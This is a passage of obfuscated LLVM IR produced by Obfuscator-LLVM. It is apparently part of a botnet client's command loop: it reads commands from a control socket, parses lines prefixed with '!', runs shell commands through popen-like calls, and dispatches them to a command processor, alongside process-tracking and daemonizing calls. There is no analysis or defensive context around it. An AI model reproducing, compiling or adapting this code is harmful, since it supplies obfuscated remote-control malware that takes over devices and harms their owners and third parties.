; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32*, i32** @pids, align 8
  %119 = load i32, i32* %14, align 4
  %120 = zext i32 %119 to i64
  %121 = getelementptr inbounds i32, i32* %118, i64 %120
  %122 = load i32, i32* %121, align 4
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %14, align 4
  %125 = sub i32 %124, 1
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %123, i64 %126
  store i32 %122, i32* %127, align 4
  store i32 -2038945979, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %14, align 4
  %130 = add i32 %129, 1
  store i32 %130, i32* %14, align 4
  store i32 91225015, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load i32*, i32** @pids, align 8
  %133 = load i32, i32* %14, align 4
  %134 = sub i32 %133, 1
  %135 = zext i32 %134 to i64
  %136 = getelementptr inbounds i32, i32* %132, i64 %135
  store i32 0, i32* %136, align 4
  %137 = load i64, i64* @numpids, align 8
  %138 = add i64 %137, -1
  store i64 %138, i64* @numpids, align 8
  %139 = load i64, i64* @numpids, align 8
  %140 = add i64 %139, 1
  %141 = mul i64 %140, 4
  %142 = call noalias i8* @malloc(i64 %141) #2
  %143 = bitcast i8* %142 to i32*
  store i32* %143, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 440952719, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i32, i32* %14, align 4
  %146 = zext i32 %145 to i64
  %147 = load i64, i64* @numpids, align 8
  %148 = icmp ult i64 %146, %147
  %149 = select i1 %148, i32 19627121, i32 721266104
  store i32 %149, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32*, i32** @pids, align 8
  %152 = load i32, i32* %14, align 4
  %153 = zext i32 %152 to i64
  %154 = getelementptr inbounds i32, i32* %151, i64 %153
  %155 = load i32, i32* %154, align 4
  %156 = load i32*, i32** %13, align 8
  %157 = load i32, i32* %14, align 4
  %158 = zext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  store i32 %155, i32* %159, align 4
  store i32 1288944268, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i32, i32* %14, align 4
  %162 = add i32 %161, 1
  store i32 %162, i32* %14, align 4
  store i32 440952719, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i32*, i32** @pids, align 8
  %165 = bitcast i32* %164 to i8*
  call void @free(i8* %165) #2
  %166 = load i32*, i32** %13, align 8
  store i32* %166, i32** @pids, align 8
  store i32 672750451, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  store i32 870772919, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %12, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %12, align 4
  store i32 1063275455, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = load i32, i32* %11, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %173
  store i8 0, i8* %174, align 1
  %175 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %175)
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %177 = call i8* @strstr(i8* %176, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0)) #10
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %179 = icmp eq i8* %177, %178
  %180 = select i1 %179, i32 1241800617, i32 1391555817
  store i32 %180, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* @mainCommSock, align 4
  %183 = call i32 (i32, i8*, ...) @sockprintf(i32 %182, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i32 0, i32 0))
  store i32 1589035615, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %186 = call i8* @strstr(i8* %185, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.127, i32 0, i32 0)) #10
  %187 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %188 = icmp eq i8* %186, %187
  %189 = select i1 %188, i32 1623437204, i32 -1659525967
  store i32 %189, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:191:                                    ; preds = %loopEntry
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %192, i8** %15, align 8
  %193 = load i8*, i8** %15, align 8
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 33
  %197 = select i1 %196, i32 1052850751, i32 -935221632
  store i32 %197, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i8*, i8** %15, align 8
  %200 = getelementptr inbounds i8, i8* %199, i64 1
  store i8* %200, i8** %16, align 8
  store i32 1564218396, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i8*, i8** %16, align 8
  %203 = load i8, i8* %202, align 1
  %204 = zext i8 %203 to i32
  %205 = icmp ne i32 %204, 32
  %206 = select i1 %205, i32 763521479, i32 -1819910610
  store i32 %206, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %16, align 8
  %209 = load i8, i8* %208, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp ne i32 %210, 0
  store i32 -1819910610, i32* %switchVar
  store i1 %211, i1* %.reg2mem3
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %213 = select i1 %.reload4, i32 43709603, i32 -1323892405
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8*, i8** %16, align 8
  %216 = getelementptr inbounds i8, i8* %215, i32 1
  store i8* %216, i8** %16, align 8
  store i32 1564218396, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8*, i8** %16, align 8
  %219 = load i8, i8* %218, align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 0
  %222 = select i1 %221, i32 -1894499510, i32 -745724065
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  store i32 1589035615, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i8*, i8** %16, align 8
  store i8 0, i8* %225, align 1
  %226 = load i8*, i8** %15, align 8
  %227 = getelementptr inbounds i8, i8* %226, i64 1
  store i8* %227, i8** %16, align 8
  %228 = load i8*, i8** %15, align 8
  %229 = load i8*, i8** %16, align 8
  %230 = call i64 @strlen(i8* %229) #10
  %231 = getelementptr inbounds i8, i8* %228, i64 %230
  %232 = getelementptr inbounds i8, i8* %231, i64 2
  store i8* %232, i8** %15, align 8
  store i32 -1606403652, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i8*, i8** %15, align 8
  %235 = load i8*, i8** %15, align 8
  %236 = call i64 @strlen(i8* %235) #10
  %237 = sub i64 %236, 1
  %238 = getelementptr inbounds i8, i8* %234, i64 %237
  %239 = load i8, i8* %238, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp eq i32 %240, 10
  %242 = select i1 %241, i32 231540791, i32 -700407214
  store i32 %242, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i8*, i8** %15, align 8
  %245 = load i8*, i8** %15, align 8
  %246 = call i64 @strlen(i8* %245) #10
  %247 = sub i64 %246, 1
  %248 = getelementptr inbounds i8, i8* %244, i64 %247
  %249 = load i8, i8* %248, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 13
  store i32 231540791, i32* %switchVar
  store i1 %251, i1* %.reg2mem5
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %253 = select i1 %.reload6, i32 1351526332, i32 -639236756
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8*, i8** %15, align 8
  %256 = load i8*, i8** %15, align 8
  %257 = call i64 @strlen(i8* %256) #10
  %258 = sub i64 %257, 1
  %259 = getelementptr inbounds i8, i8* %255, i64 %258
  store i8 0, i8* %259, align 1
  store i32 -1606403652, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = load i8*, i8** %15, align 8
  store i8* %261, i8** %17, align 8
  store i32 -1736587219, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = load i8*, i8** %15, align 8
  %264 = load i8, i8* %263, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp ne i32 %265, 32
  %267 = select i1 %266, i32 -2099045677, i32 -101052717
  store i32 %267, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i8*, i8** %15, align 8
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = icmp ne i32 %271, 0
  store i32 -101052717, i32* %switchVar
  store i1 %272, i1* %.reg2mem7
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %274 = select i1 %.reload8, i32 1768613994, i32 10326768
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8*, i8** %15, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %15, align 8
  store i32 -1736587219, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i8*, i8** %15, align 8
  store i8 0, i8* %279, align 1
  %280 = load i8*, i8** %15, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %15, align 8
  %282 = load i8*, i8** %17, align 8
  store i8* %282, i8** %18, align 8
  store i32 844569528, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8*, i8** %18, align 8
  %285 = load i8, i8* %284, align 1
  %286 = icmp ne i8 %285, 0
  %287 = select i1 %286, i32 -1336823926, i32 -709375106
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8*, i8** %18, align 8
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  %292 = call i32 @toupper(i32 %291) #10
  %293 = trunc i32 %292 to i8
  %294 = load i8*, i8** %18, align 8
  store i8 %293, i8* %294, align 1
  %295 = load i8*, i8** %18, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %18, align 8
  store i32 844569528, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i8*, i8** %17, align 8
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i32 0, i32 0)) #10
  %300 = icmp eq i32 %299, 0
  %301 = select i1 %300, i32 -829142402, i32 1456797452
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = call i32 @listFork()
  %304 = icmp ne i32 %303, 0
  %305 = select i1 %304, i32 1990936175, i32 1981161382
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  store i32 1589035615, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  %308 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %308, i8 0, i64 1024, i32 16, i1 false)
  %309 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %310 = load i8*, i8** %15, align 8
  %311 = call i32 (i8*, i8*, ...) @szprintf(i8* %309, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* %310)
  %312 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %313 = call i32 @fdpopen(i8* %312, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0))
  store i32 %313, i32* %20, align 4
  store i32 724651742, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %316 = load i32, i32* %20, align 4
  %317 = call i8* @fdgets(i8* %315, i32 1024, i32 %316)
  %318 = icmp ne i8* %317, null
  %319 = select i1 %318, i32 -1401962062, i32 788305330
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %321)
  %322 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %322, i8 0, i64 1024, i32 16, i1 false)
  %323 = call i32 @sleep(i32 1)
  store i32 724651742, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = load i32, i32* %20, align 4
  %326 = call i32 @fdpclose(i32 %325)
  call void @exit(i32 0) #14
  unreachable

; <label>:327:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  %328 = load i8*, i8** %15, align 8
  %329 = call i8* @strtok(i8* %328, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0)) #2
  store i8* %329, i8** %23, align 8
  %330 = load i8*, i8** %17, align 8
  %331 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %330, i8** %331, align 16
  store i32 -1855433445, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = load i8*, i8** %23, align 8
  %334 = icmp ne i8* %333, null
  %335 = select i1 %334, i32 7185758, i32 336314550
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i8*, i8** %23, align 8
  %338 = load i8, i8* %337, align 1
  %339 = zext i8 %338 to i32
  %340 = icmp ne i32 %339, 10
  %341 = select i1 %340, i32 2121359616, i32 -1566778553
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i8*, i8** %23, align 8
  %344 = call i64 @strlen(i8* %343) #10
  %345 = add i64 %344, 1
  %346 = call noalias i8* @malloc(i64 %345) #2
  %347 = load i32, i32* %22, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %348
  store i8* %346, i8** %349, align 8
  %350 = load i32, i32* %22, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %351
  %353 = load i8*, i8** %352, align 8
  %354 = load i8*, i8** %23, align 8
  %355 = call i64 @strlen(i8* %354) #10
  %356 = add i64 %355, 1
  call void @llvm.memset.p0i8.i64(i8* %353, i8 0, i64 %356, i32 1, i1 false)
  %357 = load i32, i32* %22, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %358
  %360 = load i8*, i8** %359, align 8
  %361 = load i8*, i8** %23, align 8
  %362 = call i8* @strcpy(i8* %360, i8* %361) #2
  %363 = load i32, i32* %22, align 4
  %364 = add nsw i32 %363, 1
  store i32 %364, i32* %22, align 4
  store i32 -1566778553, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0)) #2
  store i8* %366, i8** %23, align 8
  store i32 -1855433445, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i32, i32* %22, align 4
  %369 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %368, i8** %369)
  %370 = load i32, i32* %22, align 4
  %371 = icmp sgt i32 %370, 1
  %372 = select i1 %371, i32 -179801330, i32 1213739840
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  store i32 -631534329, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i32, i32* %24, align 4
  %376 = load i32, i32* %22, align 4
  %377 = icmp slt i32 %375, %376
  %378 = select i1 %377, i32 397697306, i32 -1996519719
  store i32 %378, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i32, i32* %24, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %381
  %383 = load i8*, i8** %382, align 8
  call void @free(i8* %383) #2
  store i32 1297920983, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = load i32, i32* %24, align 4
  %386 = add nsw i32 %385, 1
  store i32 %386, i32* %24, align 4
  store i32 -631534329, i32* %switchVar
  br label %loopEnd

; <label>:387:                                    ; preds = %loopEntry
  store i32 1213739840, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  store i32 -935221632, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  store i32 1589035615, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  store i32 -208711268, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  %392 = load i32, i32* %3, align 4
  ret i32 %392

loopEnd:                                          ; preds = %390, %389, %388, %387, %384, %379, %374, %373, %367, %365, %342, %336, %332, %327, %320, %314, %307, %306, %302, %297, %288, %283, %278, %275, %273, %268, %262, %260, %254, %252, %243, %233, %224, %223, %217, %214, %212, %207, %201, %198, %191, %184, %181, %171, %168, %167, %163, %160, %150, %144, %131, %128, %117, %111, %108, %99, %93, %92, %86, %82, %80, %76, %72, %71, %70, %69, %68, %67, %66, %62, %57, %53, %first, %switchDefault
  br label %loopEntry
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146616014}
!2 = !{i32 -2146615323}
!3 = !{i32 -2146614574}
!4 = !{i32 -2146613751}
!5 = !{i32 -2146612931}
!6 = !{i32 -2146611527}
!7 = !{i32 -2146610665}
!8 = !{i32 -2146609944}
